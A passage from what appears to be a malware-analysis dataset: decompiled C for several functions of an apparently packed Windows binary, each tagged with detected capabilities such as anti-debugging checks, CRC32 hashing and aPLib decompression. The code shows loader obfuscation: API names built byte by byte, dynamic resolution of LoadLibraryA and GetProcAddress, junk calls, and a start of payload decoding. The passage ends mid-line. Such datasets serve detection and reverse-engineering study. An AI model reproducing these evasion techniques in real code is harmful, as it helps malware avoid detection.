        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0042260d(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint8_t uVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    bool bVar14;\n    uint var_2ch;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h[5] & 0x8000;\n    uVar10 = *(arg_8h + 3);\n    var_20h = uVar10;\n    uVar3 = *(arg_8h + 1);\n    uVar2 = *arg_8h;\n    uVar11 = arg_8h[5] & 0x7fff;\n    iVar12 = uVar11 - 0x3fff;\n    var_1ch = uVar3;\n    var_18h = uVar2 << 0x10;\n    if (iVar12 == -0x3fff) {\n        iVar12 = 0;\n        iVar4 = 0;\n        do {\n            if ((&var_20h)[iVar4] != 0) {\n                var_20h = 0;\n                var_1ch = 0;\n                uVar5 = 2;\n                goto code_r0x00422b0e;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 3);\n        uVar5 = 0;\n    }\n    else {\n        arg_8h = NULL;\n        iVar13 = *0x439110 - 1;\n        iVar4 = *0x439110 + (*0x439110 >> 0x1f & 0x1fU) >> 5;\n        uVar9 = *0x439110 & 0x8000001f;\n        var_10h = iVar12;\n        var_ch = iVar4;\n        if (uVar9 < 0) {\n            uVar9 = (uVar9 - 1 | 0xffffffe0) + 1;\n        }\n        puVar1 = &var_20h + iVar4;\n        uVar6 = 0x1f - uVar9;\n        var_8h = 0x1f - uVar9;\n        if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n            uVar9 = (&var_20h)[iVar4] & ~(-1 << (uVar6 & 0x1f));\n            while( true ) {\n                if (uVar9 != 0) {\n                    iVar4 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n                    var_4h = 0;\n                    uVar9 = 1 << (0x1f - (iVar13 & 0x1f) & 0x1f);\n                    puVar7 = &var_20h + iVar4;\n                    arg_8h = *puVar7 + uVar9;\n                    if (arg_8h < *puVar7) goto code_r0x00422742;\n                    bVar14 = arg_8h < uVar9;\n                    do {\n                        var_4h = 0;\n                        if (!bVar14) goto code_r0x00422749;\ncode_r0x00422742:\n                        do {\n                            var_4h = 1;\ncode_r0x00422749:\n                            iVar4 = iVar4 + -1;\n                            *puVar7 = arg_8h;\n                            if ((iVar4 < 0) || (var_4h == 0)) {\n                                arg_8h = var_4h;\n                                goto code_r0x00422757;\n                            }\n                            var_4h = 0;\n                            puVar7 = &var_20h + iVar4;\n                            arg_8h = *puVar7 + 1;\n                        } while (arg_8h < *puVar7);\n                        bVar14 = arg_8h == NULL;\n                    } while( true );\n                }\n                iVar4 = iVar4 + 1;\n                if (2 < iVar4) break;\n                uVar9 = (&var_20h)[iVar4];\n            }\n        }\ncode_r0x00422757:\n        *puVar1 = *puVar1 & -1 << (var_8h & 0x1f);\n        iVar4 = var_ch + 1;\n        if (iVar4 < 3) {\n            puVar8 = &var_20h + iVar4;\n            for (iVar13 = 3 - iVar4; iVar13 != 0; iVar13 = iVar13 + -1) {\n                *puVar8 = 0;\n                puVar8 = puVar8 + 1;\n            }\n        }\n        if (arg_8h != NULL) {\n            iVar12 = uVar11 - 0x3ffe;\n        }\n        if (iVar12 < *0x43910c - *0x439110) {\n            var_20h = 0;\n            var_1ch = 0;\n        }\n        else {\n            if (*0x43910c < iVar12) {\n                if (iVar12 < *0x439108) {\n                    var_20h = var_20h & 0x7fffffff;\n                    iVar12 = iVar12 + *0x43911c;\n                    iVar4 = *0x439114 + (*0x439114 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x439114 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        var_10h = (&var_20h)[arg_8h] & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = (&var_20h)[arg_8h] >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar13 = 2;\n                    puVar8 = &var_18h + -iVar4;\n                    do {\n                        if (iVar13 < iVar4) {\n                            (&var_20h)[iVar13] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar13] = *puVar8;\n                        }\n                        iVar13 = iVar13 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar13);\n                    uVar5 = 0;\n                }\n                else {\n                    var_1ch = 0;\n                    var_18h = 0;\n                    var_20h = 0x80000000;\n                    iVar12 = *0x439114 + (*0x439114 >> 0x1f & 0x1fU) >> 5;\n                    uVar10 = *0x439114 & 0x8000001f;\n                    if (uVar10 < 0) {\n                        uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n                    }\n                    var_ch = 0;\n                    arg_8h = NULL;\n                    var_4h = 0x20 - uVar10;\n                    do {\n                        uVar3 = (&var_20h)[arg_8h];\n                        var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                        (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                        arg_8h = arg_8h + 1;\n                        var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n                    } while (arg_8h < 3);\n                    iVar4 = 2;\n                    puVar8 = &var_18h + -iVar12;\n                    do {\n                        if (iVar4 < iVar12) {\n                            (&var_20h)[iVar4] = 0;\n                        }\n                        else {\n                            (&var_20h)[iVar4] = *puVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                        puVar8 = puVar8 + -1;\n                    } while (-1 < iVar4);\n                    iVar12 = *0x43911c + *0x439108;\n                    uVar5 = 1;\n                }\n                goto code_r0x00422b0e;\n            }\n            var_10h = *0x43910c - var_10h;\n            var_20h = uVar10;\n            var_1ch = uVar3;\n            iVar12 = var_10h + (var_10h >> 0x1f & 0x1fU) >> 5;\n            uVar10 = var_10h & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n            iVar4 = *0x439110 - 1;\n            iVar12 = *0x439110 + (*0x439110 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = *0x439110 & 0x8000001f;\n            var_ch = iVar12;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            uVar6 = 0x1f - uVar10;\n            puVar1 = &var_20h + iVar12;\n            var_10h = 0x1f - uVar10;\n            if ((*puVar1 & 1 << (uVar6 & 0x1f)) != 0) {\n                uVar10 = (&var_20h)[iVar12] & ~(-1 << (uVar6 & 0x1f));\n                while (uVar10 == 0) {\n                    iVar12 = iVar12 + 1;\n                    if (2 < iVar12) goto code_r0x004228fa;\n                    uVar10 = (&var_20h)[iVar12];\n                }\n                iVar12 = iVar4 + (iVar4 >> 0x1f & 0x1fU) >> 5;\n                bVar14 = false;\n                uVar11 = 1 << (0x1f - (iVar4 & 0x1f) & 0x1f);\n                uVar3 = (&var_20h)[iVar12];\n                uVar10 = uVar3 + uVar11;\n                if ((uVar10 < uVar3) || (uVar10 < uVar11)) {\n                    bVar14 = true;\n                }\n                (&var_20h)[iVar12] = uVar10;\n                while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar14))) {\n                    uVar3 = (&var_20h)[iVar12];\n                    uVar10 = uVar3 + 1;\n                    bVar14 = false;\n                    if ((uVar10 < uVar3) || (uVar10 == 0)) {\n                        bVar14 = true;\n                    }\n                    (&var_20h)[iVar12] = uVar10;\n                }\n            }\ncode_r0x004228fa:\n            *puVar1 = *puVar1 & -1 << (var_10h & 0x1f);\n            iVar12 = var_ch + 1;\n            if (iVar12 < 3) {\n                puVar8 = &var_20h + iVar12;\n                for (iVar4 = 3 - iVar12; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar8 = 0;\n                    puVar8 = puVar8 + 1;\n                }\n            }\n            uVar10 = *0x439114 + 1;\n            iVar12 = uVar10 + (uVar10 >> 0x1f & 0x1fU) >> 5;\n            uVar10 = uVar10 & 0x8000001f;\n            if (uVar10 < 0) {\n                uVar10 = (uVar10 - 1 | 0xffffffe0) + 1;\n            }\n            var_ch = 0;\n            arg_8h = NULL;\n            var_4h = 0x20 - uVar10;\n            do {\n                uVar3 = (&var_20h)[arg_8h];\n                var_10h = uVar3 & ~(-1 << (uVar10 & 0x1f));\n                (&var_20h)[arg_8h] = uVar3 >> (uVar10 & 0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x00422b0e:\n    var_20h = iVar12 << (0x1fU - *0x439114 & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x439118 == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x439118 == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3612
    },
    "00426ce0": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nuint32_t fcn.00426ce0(void)\n\n{\n    uint var_f4h;\n    uint var_f0h;\n    uint var_b0h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x902120 = 0xa8438664;\n    *0x902124 = 0xffffffff;\n    var_2ch = *0x902120;\n    if (*0x6274304 == 0x1295) {\n        (*_sym.imp.GDI32.dll_GetFontUnicodeRanges)(0, &var_58h);\n        *0x8f9e4c = 0;\n        var_5ch = *0x8f9e4c;\n    }\n    *0x9025e0 = 0;\n    *0x9025e4 = 0;\n    var_10h = 0x343fd;\n    *0x902110 = *0x902110 * 0x343fd;\n    *0x626dba8 = 0xdb6007ee;\n    var_44h = *0x626dba8;\n    var_14h = *0x9025e0;\n    if (*0x6274304 == 7) {\n        (*_sym.imp.USER32.dll_OpenClipboard)(0);\n        (*_sym.imp.GDI32.dll_GetSystemPaletteEntries)(0, 0, 0, &var_64h);\n        (*_sym.imp.USER32.dll_GetDCEx)(0, 0, 0);\n        *0x626b110 = 0x9fa8cce2;\n        *0x626b114 = 0xffffffff;\n        var_60h = *0x626b110;\n    }\n    *0x626b1f0 = 0;\n    var_28h = 0x269ec3;\n    *0x902110 = *0x902110 + 0x269ec3;\n    *0x626aa20 = 0xa9a70f32;\n    *0x626aa24 = 0xffffffff;\n    var_18h = *0x626b1f0;\n    var_ch = *0x626aa20;\n    if (*0x6274304 == 0x3f2) {\n        (*_sym.imp.USER32.dll_SendMessageTimeoutA)(0, 0, 0, 0, 0, 0, &var_6ch);\n        (*_sym.imp.KERNEL32.DLL_HeapFree)(0, 0, 0);\n        *0x626b57c = 0;\n        var_68h = *0x626b57c;\n    }\n    *0x902068 = 0xfb3677de;\n    *0x90206c = 0xffffffff;\n    var_38h = *0x902110;\n    *0x901fec = 0;\n    var_8h = *0x902068;\n    var_4h = *0x901fec;\n    if (*0x6274304 == 0x123d) {\n        (*_sym.imp.ADVAPI32.dll_RegSetKeySecurity)(0, 0, 0);\n        *0x902154 = 0xb16a806a;\n        var_70h = *0x902154;\n    }\n    *0x626b18c = 0xecc684d8;\n    var_20h = 0x10;\n    var_38h = var_38h >> 0x10;\n    *0x9020f8 = 0xf3bf7d72;\n    var_40h = *0x626b18c;\n    var_30h = *0x9020f8;\n    if (*0x6274304 == 0x10f3) {\n        (*_sym.imp.USER32.dll_GetWindowInfo)(0, &var_b0h);\n        (*_sym.imp.KERNEL32.DLL_GetVersion)();\n        *0x626b0f0 = 0xf07e56b2;\n        var_74h = *0x626b0f0;\n    }\n    *0x626b108 = 0xb8c8d9a0;\n    var_1ch = 0x7fff;\n    var_38h = var_38h & 0x7fff;\n    *0x626b080 = 0x8c4ffed4;\n    *0x626b084 = 0xffffffff;\n    if (*0x6274304 == 0x1e9) {\n        var_3ch = *0x626b108;\n        var_34h = *0x626b080;\n        (*_sym.imp.KERNEL32.DLL_SetFileShortNameW)(0, L\"Ziroroba mexiyu bifufisonune hukaweteru\");\n        (*_sym.imp.KERNEL32.DLL_FindActCtxSectionGuid)(0, 0, 0, 0, &var_f0h);\n        *0x626b560 = 0;\n        *0x626b564 = 0;\n    }\n    *0x902634 = 0xb138f23e;\n    return var_38h;\n}\n",
        "token_count": 1291
    },
    "00427750": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00427750(int32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    char16_t acStackY12636 [1026];\n    uint uStackY10584;\n    uint uStackY10580;\n    char16_t acStackY10576 [8];\n    uint uStackY10560;\n    uint uStackY10556;\n    uint uStackY10552;\n    uint uStackY10544;\n    uint auStackY10540 [10];\n    uint uStackY10500;\n    uint uStackY10496;\n    uint auStackY10492 [6];\n    uint uStackY10468;\n    uint uStackY10464;\n    uint uStackY10460;\n    uint uStackY10456;\n    uint auStackY10452 [256];\n    uint uStackY9428;\n    uint uStackY9424;\n    uint uStackY9420;\n    uint uStackY9416;\n    char16_t acStackY9412 [8];\n    uint auStackY9396 [2];\n    uint uStackY9388;\n    uint uStackY9384;\n    uint uStackY9380;\n    uint uStackY9376;\n    uint uStackY9372;\n    uint uStackY9368;\n    uint uStackY9364;\n    uint uStackY9360;\n    uint uStackY9356;\n    uint uStackY9352;\n    char16_t acStackY9348 [1024];\n    uint var_1c80h;\n    uint var_1c7ch;\n    uint var_1c78h;\n    uint var_1c74h;\n    uint var_1c70h;\n    uint var_186ch;\n    uint var_1838h;\n    uint var_15e8h;\n    uint ppDAHolder;\n    uint var_15e0h;\n    uint var_15dch;\n    uint var_15d8h;\n    uint var_15d4h;\n    uint var_15d0h;\n    uint var_15cch;\n    uint var_15c8h;\n    uint var_15c4h;\n    uint var_15c0h;\n    uint var_15bch;\n    uint var_15b8h;\n    uint var_15b4h;\n    uint var_15b0h;\n    uint var_15ach;\n    uint var_15a8h;\n    uint var_15a4h;\n    uint var_15a0h;\n    uint var_159ch;\n    uint var_1598h;\n    uint var_1594h;\n    uint var_1590h;\n    uint var_158ch;\n    uint var_1588h;\n    uint var_1584h;\n    uint var_1580h;\n    uint var_157ch;\n    uint var_1578h;\n    uint var_1574h;\n    uint var_1570h;\n    uint var_156ch;\n    uint var_1568h;\n    uint var_1564h;\n    uint var_1560h;\n    uint var_155ch;\n    uint var_1558h;\n    uint var_1554h;\n    uint var_1550h;\n    uint var_154ch;\n    uint var_1548h;\n    uint var_1544h;\n    uint var_1540h;\n    uint var_153ch;\n    uint var_1538h;\n    uint var_1534h;\n    uint var_1530h;\n    uint var_152ch;\n    uint var_1528h;\n    uint var_1524h;\n    uint var_1520h;\n    uint var_151ch;\n    uint var_1518h;\n    uint var_1514h;\n    uint var_1510h;\n    uint32_t var_150ch;\n    uint var_1508h;\n    uint var_1504h;\n    uint var_1500h;\n    uint var_10fch;\n    uint *Luid;\n    uint var_10f4h;\n    uint var_10f0h;\n    uint var_10ech;\n    uint var_10e8h;\n    uint var_10e4h;\n    int32_t var_10e0h;\n    uint var_10dch;\n    uint var_10d8h;\n    uint var_10d4h;\n    uint var_10d0h;\n    uint var_8d0h;\n    uint32_t var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    int32_t var_b4h;\n    uint var_b0h;\n    uint8_t var_a9h;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint8_t var_91h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint8_t var_71h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint8_t var_59h;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    uint uStackY72;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint32_t var_34h;\n    char16_t *var_30h;\n    char16_t *var_2ch;\n    char16_t *var_28h;\n    char16_t *var_24h;\n    char16_t *var_20h;\n    char16_t *var_1ch;\n    char16_t *var_18h;\n    char *var_14h;\n    char *var_10h;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    var_4h = 0x42775d;\n    fcn.00421280();\n    var_cch = *0x4380e0 ^ &stack0xfffffffc;\n    var_98h = 0;\n    *0x6275570 = 0;\n    if (*0x6274304 == 0x160) {\n        var_8h = NULL;\n        var_ch = 0;\n        var_10h = NULL;\n        var_14h = 0x427798;\n        (*_sym.imp.USER32.dll_SetWindowRgn)();\n        *0x8ffd94 = 0xdccd6d1e;\n        var_b0h = *0x8ffd94;\n    }\n    *0x6275594 = 0xd91bf212;\n    *0x6274329 = 100;\n    *0x9020e0 = NULL;\n    *0x6274322 = 0x72;\n    *0x8ffd88 = 0;\n    *0x8ffd8c = 0;\n    *0x627432a = 0x6c;\n    *0x8ffdbc = 0;\n    *0x627432b = 0x6c;\n    *0x9050f4 = 0xdeaded6a;\n    *0x6274325 = 0x6c;\n    *0x626dba0 = 0xc5cab93a;\n    *0x6274324 = 0x65;\n    *0x9050c8 = 0;\n    *0x9050cc = 0;\n    *0x6274320 = 0x6b;\n    *0x8ffdc4 = 0xb2a0ce62;\n    *0x6274327 = 0x32;\n    *0x905154 = 0xb220add4;\n    *0x6274321 = 0x65;\n    *0x626b1cc = 0x843aca1a;\n    *0x6274326 = 0x33;\n    *0x902664 = 0;\n    *0x6274328 = 0x2e;\n    *0x9020f0 = 0;\n    *0x9020f4 = 0;\n    *0x6274323 = 0x6e;\n    *0x6275598 = 0xb1371554;\n    *0x627559c = 0xffffffff;\n    *0x627432c = 0;\n    var_90h = *0x9050c8;\n    var_84h = *0x6275598;\n    var_70h = *0x905154;\n    var_64h = *0x8ffdbc;\n    var_58h = *0x9050f4;\n    var_4ch = *0x8ffdc4;\n    var_3ch = *0x8ffd88;\n    var_38h = *0x902664;\n    var_30h = *0x9020e0;\n    var_18h = *0x6275594;\n    var_14h = *0x626dba0;\n    var_10h = *0x626b1cc;\n    for (var_b4h = 0; var_b4h < 0x665b63; var_b4h = var_b4h + 1) {\n        *0x90207c = 0;\n        if (*0x6274304 == 0xae5) {\n            *0x9050a8 = 0xab072d5e;\n            var_c8h = *0x9050a8;\n        }\n        *0x902070 = 0;\n        *0x902074 = 0;\n        var_c4h = *0x90207c;\n        var_b8h = *0x902070;\n        if (var_b4h == 0x4391b8) {\n            var_8h = 0x6274320;\n            var_ch = 0x427dc2;\n            *0x626db2c = (*_sym.imp.KERNEL32.DLL_LoadLibraryA)();\n        }\n        *0x905120 = 0;\n        var_c0h = *0x905120;\n        if (*0x6274304 == 0x5e1) {\n            var_10dch = 0;\n            var_8h = &fcn.00427750::var_10d4h;\n            var_ch = 0;\n            var_10h = NULL;\n            var_14h = &fcn.00427750::var_8d0h;\n            var_18h = NULL;\n            var_1ch = 0x427e5e;\n            (*_sym.imp.KERNEL32.DLL_ReadConsoleOutputCharacterW)();\n            var_1ch = NULL;\n            var_20h = &fcn.00427750::var_10d0h;\n            var_24h = NULL;\n            var_28h = NULL;\n            var_2ch = 0x427e71;\n            (*_sym.imp.USER32.dll_LoadStringW)();\n            *0x8f9e58 = 0;\n            var_10d8h = *0x8f9e58;\n        }\n        *0x9050b8 = 0xb1466d4a;\n        *0x9050bc = 0xffffffff;\n        var_bch = *0x9050b8;\n    }\n    *0x903e3b = 0x62;\n    *0x902048 = 0;\n    *0x90204c = 0;\n    *0x903e3c = 0x61;\n    *0x902128 = 0xbc1c9f72;\n    *0x90212c = 0xffffffff;\n    *0x903e41 = 0x6f;\n    *0x626db3c = 0;\n    *0x903e38 = 0x47;\n    *0x626b120 = 0xfcbba550;\n    *0x903e3a = 0x6f;\n    *0x8ffdb4 = 0xb7b1c756;\n    *0x903e3f = 0x6c;\n    *0x902050 = 0xd1ff47a0;\n    *0x903e40 = 0x6c;\n    *0x626b0c8 = 0xe153f264;\n    *0x903e42 = 99;\n    *0x626b060 = NULL;\n    *0x626b064 = 0;\n    *0x903e39 = 0x6c;\n    *0x905104 = 0;\n    *0x903e3d = 0x6c;\n    *0x902608 = 0x96575442;\n    *0x903e3e = 0x41;\n    *0x9050d8 = 0x9e077d66;\n    *0x903e43 = 0;\n    var_8h = 0x903e38;\n    var_ch = *0x626db2c;\n    var_10h = 0x428394;\n    var_a8h = *0x902048;\n    var_a4h = *0x902128;\n    var_9ch = *0x626b120;\n    var_8ch = *0x8ffdb4;\n    var_88h = *0x902608;\n    var_80h = *0x626b0c8;\n    var_6ch = *0x626db3c;\n    var_54h = *0x9050d8;\n    var_28h = *0x902050;\n    var_24h = *0x626b060;\n    *0x90514c = (*_sym.imp.KERNEL32.DLL_GetProcAddress)();\n    for (var_10e0h = 0; var_10e0h < 0x41cf52; var_10e0h = var_10e0h + 1) {\n        *0x90210c = 0xcaeb748a;\n        if (*0x6274304 == 0x119a) {\n            *0x8ff938 = 0;\n            var_10f4h = *0x8ff938;\n        }\n        *0x902114 = 0xe4c69c20;\n        var_10f0h = *0x902114;\n        var_10e8h = *0x90210c;\n        if (var_10e0h == 0x2df306) {\n            var_10h = *arg_ch;\n            var_14h = NULL;\n            var_18h = 0x42852b;\n            var_40h = (**0x90514c)();\n        }\n        *0x626db58 = 0xad13f7ee;\n        var_10e4h = *0x626db58;\n        if (*0x6274304 == 0x9ab) {\n            var_10h = Luid;\n            var_14h = 0x4285b1;\n            (*_sym.imp.ADVAPI32.dll_AllocateLocallyUniqueId)();\n            *0x9025f4 = 0;\n            var_10fch = *0x9025f4;\n        }\n        *0x626b0e0 = 0x8e88ed3c;\n        *0x626b0e4 = 0xffffffff;\n        var_10ech = *0x626b0e0;\n    }\n    *0x626b138 = 0;\n    *0x626b13c = 0;\n    var_68h = *0x626b138;\n    if (*0x6274304 == 0x41f) {\n        var_10h = NULL;\n        var_14h = NULL;\n        var_18h = NULL;\n        var_1ch = 0x42869f;\n        (*_sym.imp.KERNEL32.DLL_PrepareTape)();\n        var_1ch = &fcn.00427750::var_1500h;\n        var_20h = NULL;\n        var_24h = L\"Sarufecifu\";\n        var_28h = L\"Coyerapevede xa rilojehoweso\";\n        var_2ch = 0x4286b8;\n        (*_sym.imp.KERNEL32.DLL_GetTempFileNameA)();\n        *0x905144 = 0xc0fe1394;\n        var_1504h = *0x905144;\n    }\n    *0x626b580 = NULL;\n    *0x626b584 = 0;\n    var_34h = 0;\n    *0x902000 = 0x995e48b0;\n    *0x902004 = 0xffffffff;\n    var_7ch = *0x902000;\n    var_1ch = *0x626b580;\n    if (*0x6274304 == 0x71e) {\n        var_10h = NULL;\n        var_14h = 0x4287b5;\n        (*_sym.imp.USER32.dll_GetWindowTextLengthW)();\n        *0x626b158 = 0;\n        *0x626b15c = 0;\n        var_1508h = *0x626b158;\n    }\n    *0x902100 = 0xcd3acf20;\n    var_48h = 4;\n    var_4h = *0x902100;\n    for (var_150ch = 0; var_150ch < *arg_ch; var_150ch = var_150ch + var_48h) {\n        *0x627556c = 0;\n        var_15d4h = *0x627556c;\n        if (*0x6274304 == 0xc35) {\n            var_10h = &fcn.00427750::ppDAHolder;\n            var_14h = 0x428961;\n            (*_sym.imp.ole32.dll_CreateDataAdviseHolder)();\n            *0x626db90 = 0;\n            *0x626db94 = 0;\n            var_15e0h = *0x626db90;\n        }\n        *0x9020cc = 0xd38c8376;\n        var_a9h = *(*arg_8h + var_150ch);\n        *0x626b154 = 0xaefde524;\n        var_15cch = *0x626b154;\n        var_1548h = *0x9020cc;\n        if (*0x6274304 == 0x1349) {\n            var_10h = NULL;\n            var_14h = NULL;\n            var_18h = NULL;\n            var_1ch = NULL;\n            var_20h = 0x428abe;\n            (*_sym.imp.GDI32.dll_PolyPolyline)();\n            var_20h = NULL;\n            var_24h = &fcn.00427750::var_1838h;\n            var_28h = NULL;\n            var_2ch = 0x428acf;\n            (*_sym.imp.GDI32.dll_GetLogColorSpaceW)();\n            var_2ch = NULL;\n            var_30h = 0x428ad7;\n            (*_sym.imp.GDI32.dll_GetMapMode)();\n            var_30h = NULL;\n            var_34h = 0x428adf;\n            (*_sym.imp.KERNEL32.DLL_IsValidCodePage)();\n            *0x90513c = 0x943743b0;\n            var_15e8h = *0x90513c;\n        }\n        *0x905130 = 0xb73c0a74;\n        *0x905134 = 0xffffffff;\n        uStackY72 = uStackY72 & 0xffffff | *(var_150ch + 1 + *arg_8h) << 0x18;\n        *0x62755a8 = 0;\n        *0x62755ac = 0;\n        var_15c8h = *0x62755a8;\n        var_1524h = *0x905130;\n        if (*0x6274304 == 0xadb) {\n            var_10h = NULL;\n            var_14h = &fcn.00427750::var_1c70h;\n            var_18h = NULL;\n            var_1ch = 0x428be4;\n            (*_sym.imp.USER32.dll_GetClipboardFormatNameA)();\n            var_1ch = &fcn.00427750::var_186ch;\n            var_20h = NULL;\n            var_24h = 0x428bf3;\n            (*_sym.imp.KERNEL32.DLL_GetFileInformationByHandle)();\n            var_24h = NULL;\n            var_28h = 0x428bfb;\n            (*_sym.imp.USER32.dll_MessageBeep)();\n            *0x9025c8 = 0;\n            *0x9025cc = 0;\n            var_1c74h = *0x9025c8;\n        }\n        var_15c4h = 0;\n        *0x8ff940 = 0;\n        var_71h = *(var_150ch + 2 + *arg_8h);\n        *0x626b594 = 0;\n        var_1590h = *0x626b594;\n        if (*0x6274304 == 0x66f) {\n            var_10h = NULL;\n            var_14h = NULL;\n            var_18h = 0x428ca8;\n            (*_sym.imp.ole32.dll_CoDisconnectObject)();\n            var_18h = NULL;\n            var_1ch = 0x428cb0;\n            (*_sym.imp.GDI32.dll_GdiSetBatchLimit)();\n            *0x626b0d8 = 0x8a178b82;\n            var_1c78h = *0x626b0d8;\n        }\n        *0x9050d0 = 0;\n        *0x9050d4 = 0;\n        var_59h = *(var_150ch + 3 + *arg_8h);\n        *0x8f9e80 = 0;\n        var_15c0h = *0x8f9e80;\n        var_1598h = *0x9050d0;\n        if (*0x6274304 == 0xb3c) {\n            var_10h = &fcn.00427750::var_1c7ch;\n            var_14h = &fcn.00427750::var_1c80h;\n            var_18h = &stack0xffffdb7c;\n            var_1ch = L\"Yepekefoneve dexi jomeyu luduwa toye\";\n            var_20h = L\"Hoxolevowasexo dolezusezapa jete xekiwemalupufo viyadizora\";\n            var_24h = 0x428e99;\n            (*_sym.imp.ADVAPI32.dll_LookupPrivilegeDisplayNameW)();\n            var_24h = L\"Bajipozudi rupuvosi kuwi\";\n            var_28h = NULL;\n            var_2ch = L\"Noparoyuto zojowajosa yowuhu\";\n            var_30h = L\"Pugizafe\";\n            var_34h = 0x428eb0;\n            (*_sym.imp.KERNEL32.DLL_GetPrivateProfileIntW)();\n            *0x902118 = 0;\n            uStackY9352 = *0x902118;\n        }\n        *0x902138 = 0xeea28f1a;\n        *0x90213c = 0xffffffff;\n        var_91h = var_59h;\n        *0x8ff918 = 0xdeb66330;\n        *0x8ff91c = 0xffffffff;\n        var_155ch = *0x8ff918;\n        var_1530h = *0x902138;\n        if (*0x6274304 == 0xe71) {\n            var_10h = NULL;\n            var_14h = 0x428ffc;\n            (*_sym.imp.KERNEL32.DLL_FindCloseChangeNotification)();\n            *0x6275590 